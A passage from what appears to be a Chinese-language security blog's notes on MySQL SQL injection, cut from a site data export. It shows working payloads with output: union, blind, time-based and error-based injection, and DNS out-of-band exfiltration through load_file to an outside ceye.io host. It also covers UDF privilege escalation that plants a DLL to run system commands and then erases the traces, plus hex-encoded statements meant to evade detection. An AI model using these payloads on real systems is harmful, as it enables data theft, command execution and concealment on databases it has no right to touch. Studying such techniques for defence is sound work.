name | password | id | +-------+----------+------+ | admin | 0 | 0 | +-------+----------+------+ 1 row in set (0.00 sec) /*也可以用盲注*/ mysql> select * from test where id = 1 and length((select d.2 from (select * fro m (select 1)a join (select 2)b join (select 3)c union select * from test)d limit 1 offset 1)) > 1; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | admin | 1 | +-------+----------+------+ 1 row in set (0.00 sec) 0x05 limit 注入mysql select语句执行顺序原文404了，引用一下别人的吧mysql 5.x的select语法 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] mysql中在order by前面可以使用union关键字 mysql> select * from test where id > 0 limit 1 union select 1,2,3 from test order by 1; +-------+----------+------+ | name | password | id | +-------+----------+------+ | 1 | 2 | 3 | | admin | admin | 1 | +-------+----------+------+ 2 rows in set (0.00 sec) mysql> select * from test where id > 0 order by 1 limit 1 union select 1,2,3 from test; ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY 用procedure analyse进行报错注入 mysql> select * from test where id > 0 order by 1 limit 1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~' mysql> select * from test where id > 0 order by 1 limit 1 procedure analyse(updatexml(1,concat(0x7e,(select version()),0x7e),1),1); ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select version()),0x7e),1),1)' at line 1 但是这里面解析不了select子句，Daedalus说是mysql版本问题，玩不了了 0x06 order by 注入报错 mysql> select id from test order by 1 and updatexml(1,concat(0x7e,(select user()),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~' 时间盲注 mysql> select id from test order by (select if (1=1, sleep(1), 1) ); +------+ | id | +------+ | 1 | | 2 | +------+ 2 rows in set (2.03 sec) 返回时间有几秒就说明有几个数据，可以调整一下sleep的时间 0x07 mysql 带外注入UNC(Universal Naming Convention)UNC为网络（主要指局域网）上资源的完整 Windows 2000 名称格式为：\\servername\\sharename\\directory\\filenamemysql的load_file函数支持这种路径格式来加载外部文件，所以只能适用于windows的操作系统 原理如果本地hosts文件和本地dns解析器都没有与域名对应的映射关系，则会去查找本地dns服务器，如果本地DNS服务器本地区域文件与缓存解析都失效，且本地DNS服务器未用转发模式，本地DNS就把请求发至13台根DNS，然后按照上图依次查询。 payloadmysql> SELECT CONCAT('\\\\\\\\',(select database()),'.qlcegs.ceye.io\\\\abc.txt'); +---------------------------------------------------------------+ | CONCAT('\\\\\\\\',(select database()),'.qlcegs.ceye.io\\\\abc.txt') | +---------------------------------------------------------------+ | \\\\security.qlcegs.ceye.io\\abc.txt | +---------------------------------------------------------------+ 1 row in set (0.00 sec) /*前一个反斜线起转义作用*/ mysql> SELECT load_file(CONCAT('\\\\\\\\',(select database()),'.qlcegs.ceye.io\\\\abc.txt')); 在dns上看到的效果： 0x08 mysql udf提权udf(user defined function)是mysql的一个拓展接口，提权分为三个步骤：1）将含有自定义函数的DLL文件（Linux为so文件）反到特定文件夹下。2）声明引入这个DLL文件中的自定义函数。3）使用自定义函数执行系统调用。使用自定义函数可以以mysql启动权限执行系统命令。 dll在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。 plugin在mysql版本&gt;5.1时，udf要求导出到mysql&#x2F;lib&#x2F;plugin目录下，且默认不存在可以使用ads流创建文件夹 select 'lib' into dumpfile 'E:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib::$INDEX_ALLOCATION'; select 'plugin' into dumpfile 'E:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION'; /*自己实验失败 errcode 13 没找到解决方法*/ 创建函数可以用webshell创建plugin目录后找任意的地方上传udf.dll文件再导出到plugin目录创建函数，必须有数据库insert权限，因为操作会在mysql.func系统表中添加一行记录 select load_file(\"C:/phpStudy/PHPTutorial/WWW/udf.dll\") into dumpfile 'C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll'; create function shell returns string soname 'udf.dll'; 没有webshell或者上传业务的话可以这样做 select hex(load_file('c:/udf.dll')); /*得到dll的16进制*/ select unhex('udf.dll hex code') into dumpfile 'C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll'; create function shell returns string soname 'udf.dll'; 随后就可以来执行系统命令，还可以擦除痕迹 select shell(\"cmd\",\"net user\"); drop function shell; delete from mysql.func where name = 'shell'; 预编译主要有三句： mysql> prepare sql_stmt from \"select * from users where id = ?\"; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql> set @a='1'; Query OK, 0 rows affected (0.00 sec) mysql> execute sql_stmt using @a; +------+-------+ | id | name | +------+-------+ | 1 | admin | +------+-------+ 1 row in set (0.00 sec) #general_log： Query PREPARE sql_stmt FROM ... Prepare select * from users where id = ? Query set @a='1' Query execute sql_stmt using @a Execute select * from users where id = '1' 0x01 mysqli&lt;?php $servername = \"localhost\"; $username = \"root\"; $password = \"root\"; $dbname = \"user\"; // 创建连接 $conn = new mysqli($servername, $username, $password, $dbname); // 检测连接 if ($conn->connect_error) { die(\"连接失败: \" . $conn->connect_error); } // 预处理及绑定 $stmt = $conn->prepare(\"select * from users where id = ?\"); $stmt->bind_param(\"d\", $_GET[\"id\"]);//s:string d:int $stmt->execute(); // 获取查询结果 $result = $stmt->get_result(); // 处理查询结果 if ($result->num_rows > 0) { // 从结果集中获取数据 while ($row = $result->fetch_assoc()) { var_dump($row); // 这里可以根据需要对数据进行处理 } } else { echo \"没有找到匹配的结果。\"; } $stmt->close(); $conn->close(); 预编译+转义，不存在sqli 0x02 pdo&lt;?php $servername = \"localhost\"; $username = \"root\"; $password = \"root\"; $dbname = \"user\"; // 创建连接 $conn = new PDO(\"mysql:host=$servername;dbname=$dbname;charset=gbk\", $username, $password); $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // 预处理及绑定 $id = $_GET[\"id\"]; $stmt = $conn->prepare(\"select * from users where id = ?\"); $stmt->bindParam(1, $id); $stmt->execute(); // 获取查询结果 $result = $stmt->fetchAll(PDO::FETCH_ASSOC); // 处理查询结果 if ($result) { foreach ($result as $row) { var_dump($row); // 这里可以根据需要对数据进行处理 } } else { echo \"没有找到匹配的结果。\"; } 默认是模拟预编译，转义以后直接发送到mysql： Connect root@localhost on user using TCP/IP Query select * from users where id = '1\\'' Quit 需要加入 $conn-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);如果是模拟预编译，则存在宽字节注入的问题。但我实测失败了，日志显示是逃逸了单引号的。 Connect root@localhost on user using TCP/IP Query select * from users where id = '-1\\運' or 1=1 -- ' Quit 堆叠注入pdo默认配置就存在堆叠注入的问题，可以用sleep测试是否执行成功：id=1;select%20sleep(1)。可以配合prepare语句支持16进制的特性来绕过一些检测。 mysql> set @s = 0x73656C6563742064617461626173652829; Query OK, 0 rows affected (0.00 sec) mysql> prepare sql_stmt from @s; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql> execute sql_stmt; +------------+ | database() | +------------+ | user | +------------+ 1 row in set (0.00 sec) 关闭模拟预处理后，如果能控制prepare模板，则也可以触发报错注入。 mysql> prepare statm from \"select id,updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) from users where id=?\"; ERROR 1105 (HY000): XPATH syntax error: '~user~' 但获取的信息有限，不能将database()替换为select字句","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"}]}],"categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"},{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"},{"name":"CTF","slug":"CTF","permalink":"https://0xr1ngs.github.io/categories/CTF/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"未授权访问","slug":"未授权访问","permalink":"https://0xr1ngs.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"cbc","slug":"cbc","permalink":"https://0xr1ngs.github.io/tags/cbc/"},{"name":"xss","slug":"xss","permalink":"https://0xr1ngs.github.io/tags/xss/"},{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"},{"name":"csrf","slug":"csrf","permalink":"https://0xr1ngs.github.io/tags/csrf/"},{"name":"xxe","slug":"xxe","permalink":"https://0xr1ngs.github.io/tags/xxe/"},{"name":"文件上传","slug":"文件上传","permalink":"https://0xr1ngs.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]}